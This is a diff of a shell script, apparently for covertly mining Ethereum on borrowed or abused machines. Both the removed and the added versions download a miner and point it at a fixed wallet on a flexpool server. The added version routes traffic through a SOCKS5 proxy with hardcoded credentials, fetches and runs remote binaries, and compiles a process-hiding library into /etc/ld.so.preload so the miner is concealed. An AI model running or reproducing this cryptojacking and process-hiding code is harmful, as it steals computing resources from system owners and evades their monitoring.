@@ -1,13 +1,45 @@
-sudo apt update
-sudo apt install screen -y
-screen -dmS gr2.sh 89 95
-%cd /opt
-sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider
-sudo apt install libpci3
-sudo apt-get install screen
-wget -nv -c https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz -O - | tar -xz
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo LD_PRELOAD="" ./t-rex -a ethash -o stratum+ssl://eth-hk.flexpool.io:5555 -u 0x0F8824d694772df58840EDdD06a36526A0063438 -p x -w $ip --keep-gpu-busy 
-while [ 1 ]; do
-  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
-sleep 2
-done
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo " "
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo " "
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+./graftcp/graftcp ./bezzHash --url=ssl://0x0F8824d694772df58840EDdD06a36526A0063438.DENT@eth-hk.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
